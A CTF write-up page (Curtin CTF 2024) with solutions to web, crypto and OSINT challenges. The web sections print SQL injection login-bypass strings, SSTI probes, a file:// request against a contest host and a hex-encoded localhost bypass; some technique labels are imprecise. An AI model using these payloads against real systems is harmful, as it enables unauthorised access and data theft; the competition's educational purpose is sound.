@@ -1,0 +1,896 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Curtin CTF 2024 Write-Up | KingPinzz</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#04070f;--bg2:#070c18;--bg3:#0c1220;--card:#0f1628;
+  --accent:#00f5a0;--accent2:#00c8ff;--accent3:#7b61ff;
+  --text:#e8edf5;--text-muted:#4a5a78;--text-dim:#7a8daa;
+  --border:rgba(0,245,160,0.1);--border2:rgba(0,200,255,0.1);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;overflow-x:hidden}
+::-webkit-scrollbar{width:3px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:rgba(0,245,160,0.25);border-radius:2px}
+
+/* NAV */
+nav{
+  position:fixed;top:0;left:0;right:0;z-index:200;
+  height:60px;display:flex;justify-content:space-between;align-items:center;
+  padding:0 3rem;background:rgba(4,7,15,0.85);backdrop-filter:blur(24px);
+  border-bottom:1px solid rgba(255,255,255,0.04);
+}
+.nav-logo{
+  font-family:'JetBrains Mono',monospace;font-size:1rem;font-weight:700;
+  color:var(--accent);letter-spacing:0.08em;text-decoration:none;
+  display:flex;align-items:center;gap:0.5rem;
+}
+.nav-dot{width:6px;height:6px;border-radius:50%;background:var(--accent);animation:pulse-dot 2s ease-in-out infinite}
+.nav-back{
+  font-family:'JetBrains Mono',monospace;font-size:0.72rem;
+  color:var(--text-muted);text-decoration:none;letter-spacing:0.12em;
+  display:flex;align-items:center;gap:0.5rem;transition:color 0.2s;
+}
+.nav-back:hover{color:var(--accent)}
+.nav-back::before{content:'←';transition:transform 0.2s}
+.nav-back:hover::before{transform:translateX(-3px)}
+
+/* HERO BANNER */
+.writeup-hero{
+  min-height:40vh;display:flex;align-items:flex-end;
+  position:relative;overflow:hidden;padding-top:60px;
+}
+.wh-bg-grid{
+  position:absolute;inset:0;
+  background-image:linear-gradient(rgba(0,245,160,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,245,160,0.04) 1px,transparent 1px);
+  background-size:65px 65px;
+  mask-image:radial-gradient(ellipse 100% 100% at 50% 50%,black,transparent);
+  animation:grid-scroll 25s linear infinite;
+}
+@keyframes grid-scroll{0%{background-position:0 0}100%{background-position:65px 65px}}
+.wh-glow{
+  position:absolute;inset:0;
+  background:radial-gradient(ellipse 70% 80% at 30% 50%,rgba(0,200,255,0.07) 0%,transparent 70%),
+             radial-gradient(ellipse 50% 60% at 80% 30%,rgba(0,245,160,0.05) 0%,transparent 70%);
+}
+.wh-scan{position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,0.05) 3px,rgba(0,0,0,0.05) 4px)}
+
+.wh-inner{
+  position:relative;z-index:10;
+  max-width:900px;margin:0 auto;padding:3rem 2rem 3.5rem;width:100%;
+}
+.wh-cat{
+  font-family:'JetBrains Mono',monospace;font-size:0.68rem;
+  color:var(--accent2);letter-spacing:0.2em;
+  display:flex;align-items:center;gap:0.75rem;margin-bottom:1.25rem;
+}
+.wh-cat-line{width:28px;height:1px;background:var(--accent2)}
+h1.wh-title{
+  font-size:clamp(2rem,5vw,3.5rem);font-weight:800;
+  letter-spacing:-0.03em;line-height:1;margin-bottom:0.75rem;
+}
+h1.wh-title em{font-style:normal;color:var(--accent)}
+.wh-meta{
+  display:flex;flex-wrap:wrap;gap:1.5rem;margin-top:1.5rem;
+}
+.wh-meta-item{
+  font-family:'JetBrains Mono',monospace;font-size:0.65rem;
+  color:var(--text-muted);letter-spacing:0.12em;
+  display:flex;align-items:center;gap:0.5rem;
+}
+.wh-meta-item b{color:var(--text-dim)}
+.wh-tags{display:flex;gap:0.5rem;flex-wrap:wrap;margin-top:1.25rem}
+.wh-tag{
+  font-family:'JetBrains Mono',monospace;font-size:0.6rem;
+  padding:0.25rem 0.65rem;border-radius:2px;letter-spacing:0.08em;
+  background:rgba(0,200,255,0.07);border:1px solid rgba(0,200,255,0.15);color:var(--accent2);
+}
+
+/* RESULT BADGE */
+.result-badge{
+  display:inline-flex;align-items:center;gap:0.75rem;
+  margin-top:1.5rem;
+  padding:0.6rem 1.25rem;
+  background:rgba(0,245,160,0.07);border:1px solid rgba(0,245,160,0.2);border-radius:3px;
+}
+.rb-place{font-family:'JetBrains Mono',monospace;font-size:0.7rem;color:var(--accent);letter-spacing:0.12em}
+.rb-sep{width:1px;height:16px;background:rgba(0,245,160,0.2)}
+.rb-info{font-family:'JetBrains Mono',monospace;font-size:0.65rem;color:var(--text-muted);letter-spacing:0.1em}
+
+/* LAYOUT */
+.writeup-body{max-width:900px;margin:0 auto;padding:3rem 2rem 6rem;display:grid;grid-template-columns:1fr 220px;gap:3rem;align-items:start}
+.writeup-content{}
+.writeup-toc{position:sticky;top:80px}
+
+/* TOC */
+.toc-box{
+  padding:1.25rem;border:1px solid var(--border);border-radius:6px;
+  background:var(--card);
+}
+.toc-title{font-family:'JetBrains Mono',monospace;font-size:0.62rem;color:var(--accent);letter-spacing:0.18em;margin-bottom:1rem}
+.toc-list{list-style:none;display:flex;flex-direction:column;gap:0.1rem}
+.toc-list a{
+  font-family:'JetBrains Mono',monospace;font-size:0.62rem;color:var(--text-muted);
+  text-decoration:none;letter-spacing:0.06em;padding:0.3rem 0.5rem;border-radius:2px;
+  display:block;transition:all 0.15s;border-left:2px solid transparent;
+}
+.toc-list a:hover{color:var(--accent2);background:rgba(0,200,255,0.04);border-left-color:var(--accent2)}
+.toc-list a.active{color:var(--accent);border-left-color:var(--accent)}
+
+/* CHALLENGE SECTIONS */
+.chall{margin-bottom:3.5rem}
+.chall-header{
+  display:flex;align-items:center;gap:1rem;margin-bottom:1.5rem;
+  padding-bottom:1rem;border-bottom:1px solid rgba(255,255,255,0.05);
+}
+.chall-num{
+  font-family:'JetBrains Mono',monospace;font-size:0.65rem;
+  color:var(--accent);letter-spacing:0.12em;
+  padding:0.2rem 0.55rem;border:1px solid rgba(0,245,160,0.2);border-radius:2px;
+  min-width:36px;text-align:center;
+}
+h2.chall-name{font-size:1.3rem;font-weight:800;letter-spacing:-0.02em}
+.chall-cat{
+  margin-left:auto;font-family:'JetBrains Mono',monospace;font-size:0.6rem;
+  padding:0.2rem 0.6rem;border-radius:2px;letter-spacing:0.08em;
+}
+.cat-web{background:rgba(123,97,255,0.1);border:1px solid rgba(123,97,255,0.2);color:#a08fff}
+.cat-crypto{background:rgba(0,200,255,0.08);border:1px solid rgba(0,200,255,0.18);color:var(--accent2)}
+.cat-forensics{background:rgba(0,245,160,0.07);border:1px solid rgba(0,245,160,0.18);color:var(--accent)}
+.cat-osint{background:rgba(245,158,11,0.08);border:1px solid rgba(245,158,11,0.18);color:#fbbf24}
+.cat-misc{background:rgba(236,72,153,0.08);border:1px solid rgba(236,72,153,0.18);color:#f472b6}
+.cat-stego{background:rgba(16,185,129,0.08);border:1px solid rgba(16,185,129,0.18);color:#34d399}
+.cat-pwn{background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.18);color:#f87171}
+
+.chall-desc{font-size:0.94rem;color:var(--text-dim);line-height:1.85;margin-bottom:1.25rem}
+.chall-desc strong{color:var(--text);font-weight:700}
+
+/* CODE BLOCKS */
+.code-wrap{position:relative;margin:1.25rem 0;border-radius:6px;overflow:hidden}
+.code-label{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0.5rem 1rem;background:rgba(255,255,255,0.04);
+  border-bottom:1px solid rgba(255,255,255,0.05);
+}
+.code-lang{font-family:'JetBrains Mono',monospace;font-size:0.6rem;color:var(--text-muted);letter-spacing:0.1em}
+.code-copy{
+  font-family:'JetBrains Mono',monospace;font-size:0.58rem;color:var(--text-muted);
+  cursor:pointer;background:none;border:none;letter-spacing:0.08em;transition:color 0.2s;padding:0;
+}
+.code-copy:hover{color:var(--accent)}
+pre{
+  background:var(--bg3);padding:1.25rem;overflow-x:auto;
+  border:1px solid rgba(255,255,255,0.05);border-top:none;
+  font-family:'JetBrains Mono',monospace;font-size:0.78rem;
+  line-height:1.7;color:#c9d1d9;
+}
+pre .kw{color:var(--accent3)}
+pre .str{color:var(--accent)}
+pre .cm{color:var(--text-muted)}
+pre .fn{color:var(--accent2)}
+pre .num{color:#fbbf24}
+
+/* FLAG BOX */
+.flag-box{
+  display:flex;align-items:center;gap:1rem;
+  padding:0.85rem 1.25rem;margin:1.25rem 0;
+  background:rgba(0,245,160,0.05);border:1px solid rgba(0,245,160,0.2);
+  border-radius:4px;border-left:3px solid var(--accent);
+}
+.flag-label{font-family:'JetBrains Mono',monospace;font-size:0.6rem;color:var(--accent);letter-spacing:0.15em;min-width:36px}
+.flag-val{font-family:'JetBrains Mono',monospace;font-size:0.78rem;color:var(--text);letter-spacing:0.04em;word-break:break-all}
+
+/* STEP */
+.step{
+  padding:0.85rem 1.1rem;margin:1rem 0;
+  background:var(--bg3);border:1px solid rgba(255,255,255,0.05);border-radius:4px;
+  border-left:3px solid var(--accent2);
+}
+.step-title{font-family:'JetBrains Mono',monospace;font-size:0.65rem;color:var(--accent2);letter-spacing:0.12em;margin-bottom:0.4rem}
+.step p{font-size:0.88rem;color:var(--text-dim);line-height:1.75}
+.step p strong{color:var(--text)}
+
+/* TERMINAL OUTPUT */
+.terminal{
+  background:#000;border:1px solid rgba(0,245,160,0.15);border-radius:6px;overflow:hidden;margin:1.25rem 0;
+}
+.terminal-bar{
+  display:flex;align-items:center;gap:0.5rem;padding:0.5rem 1rem;
+  background:rgba(0,245,160,0.04);border-bottom:1px solid rgba(0,245,160,0.08);
+}
+.t-dot{width:8px;height:8px;border-radius:50%}
+.t-dot-r{background:#ff5f57}.t-dot-y{background:#febc2e}.t-dot-g{background:#28c840}
+.terminal-title{font-family:'JetBrains Mono',monospace;font-size:0.6rem;color:var(--text-muted);margin-left:0.5rem;letter-spacing:0.1em}
+.terminal pre{
+  background:transparent;border:none;padding:1rem 1.25rem;
+  color:#00f5a0;font-size:0.75rem;
+}
+.terminal pre .prompt{color:var(--text-muted)}
+.terminal pre .out{color:#c9d1d9}
+
+/* REF LINK */
+.ref-link{
+  display:inline-flex;align-items:center;gap:0.4rem;
+  font-family:'JetBrains Mono',monospace;font-size:0.65rem;
+  color:var(--accent2);text-decoration:none;letter-spacing:0.05em;
+  padding:0.25rem 0.6rem;border:1px solid rgba(0,200,255,0.18);border-radius:2px;
+  transition:all 0.18s;background:rgba(0,200,255,0.04);
+}
+.ref-link:hover{background:rgba(0,200,255,0.1);border-color:rgba(0,200,255,0.35)}
+
+/* DIVIDER */
+.chall-div{height:1px;background:linear-gradient(90deg,rgba(0,245,160,0.15),transparent);margin:3rem 0}
+
+/* CONCLUSION */
+.conclusion-box{
+  padding:2rem;border:1px solid var(--border);border-radius:8px;
+  background:var(--card);position:relative;overflow:hidden;
+}
+.conclusion-box::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,var(--accent),var(--accent2));
+}
+.conclusion-box h3{font-size:1.1rem;font-weight:800;margin-bottom:1rem}
+.conclusion-box p{font-size:0.9rem;color:var(--text-dim);line-height:1.8;margin-bottom:0.75rem}
+.conclusion-box p:last-child{margin-bottom:0}
+.conclusion-box strong{color:var(--text)}
+
+.team-chips{display:flex;gap:0.6rem;flex-wrap:wrap;margin-top:1rem}
+.team-chip{
+  font-family:'JetBrains Mono',monospace;font-size:0.68rem;
+  padding:0.35rem 0.85rem;border-radius:2px;letter-spacing:0.08em;
+}
+.tc-you{background:rgba(0,245,160,0.1);border:1px solid rgba(0,245,160,0.25);color:var(--accent)}
+.tc-mate{background:rgba(123,97,255,0.1);border:1px solid rgba(123,97,255,0.2);color:#a08fff}
+
+/* INTRO */
+.intro-card{
+  padding:1.5rem;border:1px solid var(--border2);border-radius:8px;
+  background:var(--card);margin-bottom:2.5rem;
+}
+.intro-card h3{font-size:1rem;font-weight:700;margin-bottom:0.75rem;color:var(--text)}
+.intro-card p{font-size:0.9rem;color:var(--text-dim);line-height:1.8}
+.cats-grid{display:flex;gap:0.5rem;flex-wrap:wrap;margin-top:1rem}
+
+/* ANIMATIONS */
+@keyframes pulse-dot{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.5);opacity:0.6}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
+.wu-fade{animation:fadeUp 0.5s ease both}
+
+/* RESPONSIVE */
+@media(max-width:768px){
+  nav{padding:0 1.5rem}
+  .writeup-body{grid-template-columns:1fr;gap:2rem}
+  .writeup-toc{display:none}
+  .wh-inner{padding:2rem 1.5rem 2.5rem}
+  h1.wh-title{font-size:2rem}
+}
+</style>
+</head>
+<body>
+
+<nav>
+  <a href="index.html" class="nav-logo">
+    <span class="nav-dot"></span>
+    KingPinzz.sh
+  </a>
+  <a href="index.html#achievements" class="nav-back">Back to Portfolio</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="wh-bg-grid"></div>
+  <div class="wh-glow"></div>
+  <div class="wh-scan"></div>
+  <div class="wh-inner wu-fade">
+    <div class="wh-cat">
+      <span class="wh-cat-line"></span>
+      CTF WRITE-UP
+    </div>
+    <h1 class="wh-title">Curtin CTF <em>2024</em></h1>
+    <div class="wh-meta">
+      <span class="wh-meta-item">📅 <b>12–13 October 2024</b></span>
+      <span class="wh-meta-item">🏛 <b>Curtin University Malaysia</b></span>
+      <span class="wh-meta-item">⏱ <b>24-hour Nationwide Online</b></span>
+    </div>
+    <div class="wh-tags">
+      <span class="wh-tag">Web Exploitation</span>
+      <span class="wh-tag">Cryptography</span>
+      <span class="wh-tag">OSINT</span>
+      <span class="wh-tag">Forensics</span>
+      <span class="wh-tag">Steganography</span>
+      <span class="wh-tag">Reverse Engineering</span>
+      <span class="wh-tag">Misc</span>
+    </div>
+    <div class="result-badge">
+      <span class="rb-place">🏅 4TH PLACE</span>
+      <span class="rb-sep"></span>
+      <span class="rb-info">UiTM Team · 20 challenges solved</span>
+    </div>
+  </div>
+</div>
+
+<!-- BODY -->
+<div class="writeup-body">
+
+  <!-- CONTENT -->
+  <div class="writeup-content">
+
+    <!-- INTRO -->
+    <div class="intro-card wu-fade">
+      <h3>Introduction</h3>
+      <p>In this write-up, I share my experience and insights from the Curtin CTF 2024, a 24-hour nationwide online competition hosted by Curtin University Malaysia on 12–13 October 2024. The competition covered a wide range of cybersecurity categories.</p>
+      <div class="cats-grid">
+        <span class="wh-tag" style="background:rgba(123,97,255,0.1);border-color:rgba(123,97,255,0.2);color:#a08fff">Web Exploitation</span>
+        <span class="wh-tag" style="background:rgba(0,200,255,0.08);border-color:rgba(0,200,255,0.18)">Cryptography</span>
+        <span class="wh-tag" style="background:rgba(245,158,11,0.08);border-color:rgba(245,158,11,0.18);color:#fbbf24">OSINT</span>
+        <span class="wh-tag" style="background:rgba(0,245,160,0.07);border-color:rgba(0,245,160,0.18);color:var(--accent)">Forensics / Stego</span>
+        <span class="wh-tag" style="background:rgba(239,68,68,0.08);border-color:rgba(239,68,68,0.18);color:#f87171">Reverse Engineering</span>
+        <span class="wh-tag" style="background:rgba(236,72,153,0.08);border-color:rgba(236,72,153,0.18);color:#f472b6">Misc</span>
+      </div>
+    </div>
+
+    <!-- 1. EASY LOGIN -->
+    <div class="chall" id="c1">
+      <div class="chall-header">
+        <span class="chall-num">01</span>
+        <h2 class="chall-name">Easy Login</h2>
+        <span class="chall-cat cat-web">Web</span>
+      </div>
+      <p class="chall-desc">Given a login page. The username is <strong>admin</strong> but the password is unknown. Used SQL injection bypass payloads via Burp Suite Intruder to brute force the login.</p>
+      <div class="step">
+        <div class="step-title">APPROACH</div>
+        <p>Loaded a full SQL injection wordlist into Burp Intruder, targeted the password field, and checked responses for a successful login bypass. The server returned the flag on a matching payload.</p>
+      </div>
+      <div class="code-wrap">
+        <div class="code-label"><span class="code-lang">SQL Injection Payloads (sample)</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre>admin' --
+admin' or '1'='1
+admin' or 1=1--
+' or 1=1#
+admin') or ('1'='1'--</pre>
+      </div>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{sql_1nj3ct1on_v1ct0ry}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 2. CRUMB TRAILS -->
+    <div class="chall" id="c2">
+      <div class="chall-header">
+        <span class="chall-num">02</span>
+        <h2 class="chall-name">Crumb Trails</h2>
+        <span class="chall-cat cat-web">Web</span>
+      </div>
+      <p class="chall-desc">The cookie value was set to <strong>vanilla</strong>. Changing it to <strong>chocolate</strong> via browser DevTools revealed the flag.</p>
+      <div class="step">
+        <div class="step-title">APPROACH</div>
+        <p>Opened DevTools → Application → Cookies. Changed the cookie value from <strong>vanilla</strong> to <strong>chocolate</strong> and refreshed the page.</p>
+      </div>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{c00kies_cutt3r_is_c00l}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 3. VALUABLE FEEDBACK -->
+    <div class="chall" id="c3">
+      <div class="chall-header">
+        <span class="chall-num">03</span>
+        <h2 class="chall-name">Valuable Feedback</h2>
+        <span class="chall-cat cat-web">Web</span>
+      </div>
+      <p class="chall-desc">Initial XSS attempt failed to yield anything useful. Further analysis revealed the endpoint <code>/fetch</code> was vulnerable to <strong>Server-Side Template Injection (SSTI)</strong>.</p>
+      <div class="step">
+        <div class="step-title">APPROACH</div>
+        <p>Used SSTI payloads from HackTricks to probe the template engine. The payload <strong>${7*7}</strong> returned 49, confirming SSTI vulnerability.</p>
+      </div>
+      <div class="code-wrap">
+        <div class="code-label"><span class="code-lang">SSTI Payloads</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre>${7*7}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+// Try #{...}, *{...}, @{...} or ~{...} if ${...} fails</pre>
+      </div>
+      <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" target="_blank" class="ref-link">↗ HackTricks SSTI Reference</a>
+      <div class="flag-box" style="margin-top:1.25rem">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{t3mpl4t3s_ar3_e4sy_t0_cr4ck}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 4. SNEAKY SOURCE -->
+    <div class="chall" id="c4">
+      <div class="chall-header">
+        <span class="chall-num">04</span>
+        <h2 class="chall-name">Sneaky Source</h2>
+        <span class="chall-cat cat-web">Web</span>
+      </div>
+      <p class="chall-desc">The challenge was vulnerable to <strong>Local File Inclusion (LFI)</strong>. First read <code>/etc/passwd</code> to confirm Flask was running, then pivoted to <code>/app/flag.txt</code>.</p>
+      <div class="code-wrap">
+        <div class="code-label"><span class="code-lang">LFI Request (Burp Suite)</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre>POST /fetch HTTP/1.1
+Host: 18.143.108.145:8003
+Content-Type: application/x-www-form-urlencoded
+
+url=file:///app/flag.txt</pre>
+      </div>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{S3rver_S1de_Surf1ng}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 5. INTERNAL VIEW -->
+    <div class="chall" id="c5">
+      <div class="chall-header">
+        <span class="chall-num">05</span>
+        <h2 class="chall-name">Internal View</h2>
+        <span class="chall-cat cat-web">Web</span>
+      </div>
+      <p class="chall-desc">Flag stored at <code>/internal/flag</code> accessible only from localhost. Direct access returned <em>"Access to localhost is restricted."</em> — bypassed using hexadecimal IP encoding.</p>
+      <div class="step">
+        <div class="step-title">BYPASS TECHNIQUE</div>
+        <p>Converted <strong>127.0.0.1</strong> to hex <strong>0x7f000001</strong> to bypass localhost restriction filters.</p>
+      </div>
+      <div class="code-wrap">
+        <div class="code-label"><span class="code-label-inner">Bypass Payload</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre>url=http://0x7f000001:5000/internal/flag</pre>
+      </div>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{s3rv3rs_4re_n0t_so_busy}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 6. TRIVIAL 2 -->
+    <div class="chall" id="c6">
+      <div class="chall-header">
+        <span class="chall-num">06</span>
+        <h2 class="chall-name">Trivial 2</h2>
+        <span class="chall-cat cat-crypto">Crypto</span>
+      </div>
+      <p class="chall-desc">Given <code>challenge.txt</code> and <code>challenge.py</code>. Reversed the encryption formula: <strong>x = √(E(x) − 1)</strong> to recover each character.</p>
+      <div class="code-wrap">
+        <div class="code-label"><span class="code-lang">Python — Decrypt</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre>import math
+
+encrypted_list = [4490, 7226, 6725, 7057, 5330, 6085, 9026, 4490, 7057, 4901,
+                  15130, 9605, 2705, 9802, 11450, 9026, 3026, 2305, 9026, 12997,
+                  2305, 2305, 3026, 13226, 15626]
+
+def decrypt(encrypted_list):
+    decrypted_chars = []
+    for encrypted_value in encrypted_list:
+        decrypted_value = int(math.sqrt(encrypted_value - 1))
+        decrypted_chars.append(chr(decrypted_value))
+    return ''.join(decrypted_chars)
+
+print("Decrypted flag:", decrypt(encrypted_list))</pre>
+      </div>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="t-dot t-dot-r"></span><span class="t-dot t-dot-y"></span><span class="t-dot t-dot-g"></span><span class="terminal-title">terminal</span></div>
+        <pre><span class="prompt">┌──(hackboredzz㉿hackboredzz)-[~/curtinctf]
+└─$ </span>python3 trivial.py
+<span class="out">Decrypted flag: CURTIN_CTF{b4ck_70_r007s}</span></pre>
+      </div>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{b4ck_70_r007s}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 7. BLUFF -->
+    <div class="chall" id="c7">
+      <div class="chall-header">
+        <span class="chall-num">07</span>
+        <h2 class="chall-name">Bluff</h2>
+        <span class="chall-cat cat-crypto">Crypto</span>
+      </div>
+      <p class="chall-desc">Given an encrypted flag array. Brute-forced all 4-byte XOR key combinations across the 2-byte key space, checking for the <strong>CURTIN_CTF{</strong> prefix.</p>
+      <div class="code-wrap">
+        <div class="code-label"><span class="code-lang">Python — Brute Force XOR</span><button class="code-copy" onclick="copyCode(this)">copy</button></div>
+        <pre>import itertools
+
+enc_flag = [66, 188, 199, 131, 75, 166, 245, 147, 87, 161, 232, 166,
+            114, 223, 228, 181, 118, 222, 226, 239, 115, 209, 241, 235,
+            63, 212, 169, 236, 65, 214, 173, 239, 59, 108]
+
+def decrypt(enc_flag, key):
+    decrypted_flag = []
+    key_len = len(key)
+    for i in range(len(enc_flag)):
+        chunk = i // key_len
+        offset = i % key_len
+        decrypted_char = (enc_flag[i] ^ key[offset]) - chunk
+        decrypted_flag.append(chr(decrypted_char))
+    return ''.join(decrypted_flag)
+
+for key in itertools.product(range(256), repeat=4):
+    key_bytes = [int(k) for k in key]
+    try:
+        flag = decrypt(enc_flag, key_bytes)
+        if flag.startswith("CURTIN_CTF{") and flag.endswith("}"):
+            print(f"Key: {key_bytes}, Flag: {flag}")
+            break
+    except:
+        continue</pre>
+      </div>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="t-dot t-dot-r"></span><span class="t-dot t-dot-y"></span><span class="t-dot t-dot-g"></span><span class="terminal-title">terminal</span></div>
+        <pre><span class="out">Key: [1, 233, 149, 215], Flag: CURTIN_CTF{op3n_s3s4m3_7876598112}</span></pre>
+      </div>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{op3n_s3s4m3_7876598112}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 8. AMALGAM -->
+    <div class="chall" id="c8">
+      <div class="chall-header">
+        <span class="chall-num">08</span>
+        <h2 class="chall-name">Amalgam</h2>
+        <span class="chall-cat cat-crypto">Crypto</span>
+      </div>
+      <p class="chall-desc">ElGamal encryption. Solved the discrete logarithm for the private key, computed the shared secret, then decrypted. A second step decoded the numeric result to ASCII.</p>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="t-dot t-dot-r"></span><span class="t-dot t-dot-y"></span><span class="t-dot t-dot-g"></span><span class="terminal-title">terminal</span></div>
+        <pre><span class="out">CURTIN_CTF{dlP_50lv3d:)}</span></pre>
+      </div>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{dlP_50lv3d:)}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 9. RSA1 -->
+    <div class="chall" id="c9">
+      <div class="chall-header">
+        <span class="chall-num">09</span>
+        <h2 class="chall-name">RSA1</h2>
+        <span class="chall-cat cat-crypto">Crypto</span>
+      </div>
+      <p class="chall-desc">Given <strong>n</strong>, <strong>diff_pq</strong>, <strong>e</strong>, and <strong>c</strong>. Used SageMath to factor n via the quadratic formula, then decrypted with standard RSA.</p>
+      <div class="step">
+        <div class="step-title">KEY INSIGHT</div>
+        <p>With <strong>p − q</strong> known, solve: <strong>p = (diff_pq + √(diff_pq² + 4n)) / 2</strong> using SageMath's arbitrary-precision sqrt.</p>
+      </div>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="t-dot t-dot-r"></span><span class="t-dot t-dot-y"></span><span class="t-dot t-dot-g"></span><span class="terminal-title">terminal</span></div>
+        <pre><span class="out">Plaintext in text: CURTIN_CTF{1s_7h15_50m37h1ng_c10s3_70_m4g1c?}</span></pre>
+      </div>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{1s_7h15_50m37h1ng_c10s3_70_m4g1c?}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 10. RSA2 -->
+    <div class="chall" id="c10">
+      <div class="chall-header">
+        <span class="chall-num">10</span>
+        <h2 class="chall-name">RSA2</h2>
+        <span class="chall-cat cat-crypto">Crypto</span>
+      </div>
+      <p class="chall-desc">A small RSA modulus fully factorisable with sympy. Recovered p and q, computed φ(n), derived d, and decrypted.</p>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="t-dot t-dot-r"></span><span class="t-dot t-dot-y"></span><span class="t-dot t-dot-g"></span><span class="terminal-title">terminal</span></div>
+        <pre><span class="out">The flag is: CURTIN_CTF{4_m4gn1fy1ng_gl455_w0n7_b3_n33d3d_for_sur3}</span></pre>
+      </div>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{4_m4gn1fy1ng_gl455_w0n7_b3_n33d3d_for_sur3}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 11. DANCE OF THE STREAM -->
+    <div class="chall" id="c11">
+      <div class="chall-header">
+        <span class="chall-num">11</span>
+        <h2 class="chall-name">Dance of the Stream</h2>
+        <span class="chall-cat cat-crypto">Crypto</span>
+      </div>
+      <p class="chall-desc">Custom ChaCha-like stream cipher with a de-obfuscated nonce. Brute-forced the 2-byte PRNG key across the full range, checking for the <strong>CURTIN_CTF{</strong> flag format.</p>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="t-dot t-dot-r"></span><span class="t-dot t-dot-y"></span><span class="t-dot t-dot-g"></span><span class="terminal-title">terminal</span></div>
+        <pre><span class="out">Flag found: CURTIN_CTF{g0_s0lv3_7h3_57r34m_pr0bl3m_0f_1r0d0v_n0w}</span></pre>
+      </div>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{g0_s0lv3_7h3_57r34m_pr0bl3m_0f_1r0d0v_n0w}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 12. THE PACKAGE -->
+    <div class="chall" id="c12">
+      <div class="chall-header">
+        <span class="chall-num">12</span>
+        <h2 class="chall-name">The Package</h2>
+        <span class="chall-cat cat-osint">OSINT</span>
+      </div>
+      <p class="chall-desc">Given tracking number <strong>278154251425</strong>. Initial UPS search failed. Google revealed it was a <strong>FedEx</strong> tracking number — retrieved delivery details from FedEx tracking.</p>
+      <div class="flag-box">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{Beckton_12_08_2024_60_31_20}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 13. CAR ON THE FIRE PT1 -->
+    <div class="chall" id="c13">
+      <div class="chall-header">
+        <span class="chall-num">13</span>
+        <h2 class="chall-name">Car on the Fire — Part 1</h2>
+        <span class="chall-cat cat-osint">OSINT</span>
+      </div>
+      <p class="chall-desc">Given a video of a Tesla car accident. Searched directly and found the BBC News article identifying the driver.</p>
+      <a href="https://www.bbc.com/news/world-us-canada-44511200" target="_blank" class="ref-link">↗ BBC News Reference</a>
+      <div class="flag-box" style="margin-top:1.25rem">
+        <span class="flag-label">FLAG</span>
+        <span class="flag-val">CURTIN_CTF{Michael_Morris}</span>
+      </div>
+    </div>
+
+    <div class="chall-div"></div>
+
+    <!-- 14. CAR ON THE FIRE PT4 -->
